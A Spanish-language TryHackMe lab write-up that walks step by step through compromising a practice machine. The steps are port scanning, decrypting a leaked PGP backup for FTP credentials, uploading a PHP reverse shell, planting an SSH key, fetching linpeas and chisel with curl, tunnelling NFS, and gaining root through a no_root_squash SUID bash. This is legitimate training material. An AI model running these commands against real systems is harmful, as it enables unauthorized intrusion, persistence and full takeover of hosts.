Bienvenidos a otra maquina de tryhackme. Escaneamos puertos con nuestra herramienta bien conocida, enumeramos lo maximos posible y nos encontraremos con backups, credenciales para estabelcer conexion via ftp. Enumeraremos directorio ocultos y haremos uso de importaciones de keys para luego establecer conexion ssh y movernos entre usuarios.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-17 02:32:05 EDT for 35s
Not shown: 65532 filtered ports
Reason: 65500 no-responses and 32 admin-prohibiteds
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.37 ((centos))
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any i
```

Nuestro escaneo nos muestra 3 puertos abiertos. Navegamos al servidor web para ver como esta contruido y observamos siempre el Page Source que podemos encontrar algo, pero en este caso, solo un ligero mensaje. 

Iniciamos el proceso de enumeracion con gobuster para descubrir directorios ocultos dentro del servidor web.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/17 02:31:07 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/backups (Status: 301)
/cgi-bin/ (Status: 403)
=====================================================
2023/07/17 02:31:56 Finished
=====================================================
```

Nos dirigimos a la ruta /bacups y descargamos el archivo .zip. Lo descomprimimos :

```bash
unzip backup.zip
```

Obtenemos una llave PGP (Pretty Good Privacy). Utilizamos gpg para descubrir su contenido .

```bash
gpg --import priv.key
gpg --decrypt CustomerDetails.xlsx.gpg > doc.xlsx
```

# Intrusion

Obtenemos acceso a ftp con uno de los usuarios que nos muestra el excel. Establecemos una conexions y listamos su contenido.

```bash
ftp IPTARGET

ftp> ls
229 Entering Extended Passive Mode (|||59962|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
```

Como podemos colocar archivos dentro del servicio, cargamos una reverse shell para obtener una shell en nuestra maquina atacante.
Utilizamos la reverse shell de PentestMonkey y la cargamos dentro del servicio ftp.

```bash
nano shell.php
chmod 777 shell.php

ftp> put shell.php

# Nos ponemos en escucha
nc -nvlp LPORT

# Nos dirigimos a nuestro navegador
http://IPTARGET/shell.php
```

Upgradeamos nuestra shell y nos cambiamos a usuario paradox.

```bash
# Upgradeamos shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Cambiamos a usuario
su paradox
```

Nos dirigimos al directorio .ssh y generamos una id_rsa en nuestra maquina atacante para luego establecer una conexion ssh al sistema.

```bash
cd /home/parados/.ssh

# En nuestra maquina atacante
mkdir overpasskey && cd overpasskey
ssh-keygen
chmod 600 id_rsa

# Copiamos el contenido de id_rsa.pub

# En la maquina victima
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ..." > authorized_keys

#Establecemos conexion ssh
ssh -i id_rsa paradox@IPTARGET
```


Tenemos que realizar una enumeracion en el sistema. Para este caso, usamos la herramienta linpeas que nos facilitara un poco la tarea.
Primeramente, nos dirigimos al directorio /dev/shm y abrimos un servidor python http en nuestra maquina atacante para transferirnos el archivo y ejecutarlo.

```bash
cd /dev/shm

# Abrimos servidor python http dentro del directorio en nuestra maquina atacante
python3 -m http.server 8080

# Utilizamos curl para transferir el archivo
curl http://LHOST:8080/linpeas.sh -o linpeas.sh

# Le otorgamos permisos de ejecucion
chmod +x linpeas.sh
./linpeas.sh
```

Nos muestra que el usuario james utiliza `no_root_squash`. En la pagina de hacktricks https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe, encontramos informacion sobre como escalar esta configuracion. 

Listamos conexiones de red establecidas en el sistema.

```bash
ss -lntp

LISTEN 0  64  0.0.0.0:2049  0.0.0.0:*  
```

https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting.

Enumeramos la  carpeta que esta montada en el sistema

```bash
showmount -e IPTARGET

Export list for IPTARGET:
/home/james *
```

## James

Antes de escalar y poder ser james, creamos una conexion tipo proxy para capturar todo el trafico deseado. Usamos la herramienta chisel, es una herramienta de código abierto utilizada para crear túneles seguros y redirigir el tráfico de red a través de conexiones SSH

Para instalarlo en tu maquina atacante 

```bash
curl https://i.jpillora.com/chisel! | bash

Installed at /usr/local/bin/chisel
```

Hacemos una copia de chisel en nuestro directorio de trabajo y le otorgamos todos los permisos. Abrimos servidor http python y nos copiamos chisel a la maquina victima.

```bash
cp /usr/local/bin/chisel .
chmod 777 chisel

# Abrimos servidor python http
python3 -m http.server 8080

# Dentro de la maquina victima
cd /dev/shm
curl http://LHOST:8080/chisel -o chisel
```


Creamos un tunel en nuestra maquina atacante, esto nos permite conectarnos a modo escucha en un servidor con el puerto 8089. Luego, nos conectaremos desde la maquina victima al puerto 8089 que a si mismo, reedirecciona la conexion al puerto 2049, que es el puerto al que haremos pentesting NFS.


```bash
#En nuestra maquina atacante
chisel server --reverse --port 8089
2023/07/17 14:00:22 server: Reverse tunnelling enabled
2023/07/17 14:00:22 server: Fingerprint HobqngpPtzZHdj2Kf1GJh1/RCc9o99tYLxNCQ/A0l5E=
2023/07/17 14:00:22 server: Listening on http://0.0.0.0:8089

#En maquina victima, donde tranferimos chisel
./chisel client LHOST:8089 R:2049:127.0.0.1:2049

#En nuestra sesion de chisel (Maquina atacante), recibimos respuesta:
2023/07/17 14:04:34 server: session#1: tun: proxy#R:2049=>2049: Listening

```

Nos cambiamos a usuario root, en nuestra maquina atacante, y creamos un directorio **/tmp/james** y luego montamos todo el contenido de james hacia nuestro sistema.

```bash
mkdir /tmp/james
sudo mount -t nfs localhost:/ /tmp/james/

# Listamos 
cd /tmp/james
ls -lah
total 32K
drwx------  3 ggh  ggh  112 Nov 17  2020 .
drwxrwxrwt 25 root root 16K Jul 17 14:08 ..
lrwxrwxrwx  1 root root   9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 ggh  ggh   18 Nov  8  2019 .bash_logout
-rw-r--r--  1 ggh  ggh  141 Nov  8  2019 .bash_profile
-rw-r--r--  1 ggh  ggh  312 Nov  8  2019 .bashrc
drwx------  2 ggh  ggh   61 Nov  7  2020 .ssh
-rw-------  1 ggh  ggh   38 Nov 17  2020 user.flag
```

Copiamos el la id_rsa de james, le damos los permisos adecuados y luego establecemos una conexion ssh como usuario james.

```bash
chmod 600 james.rsa
ssh -i james.rsa james@IPTARGET
```

# Priv.escalation

Tenemos que dirigirnos al directorio donde montamos el contenido de james, y crear una bash como usuario root en nuestra maquina atacante, darle permisos SUID y ejecutarlo en la maquina victima james.

```bash
# Cambiamos a root en nuestra maquina atacante
sudo su
cd /tmp/james

# Creamos bash y damos permisos
cp /bin/bash .
chmos +sx bash

# Nos movemos a james y ejecutamos bash
./bash -p
```

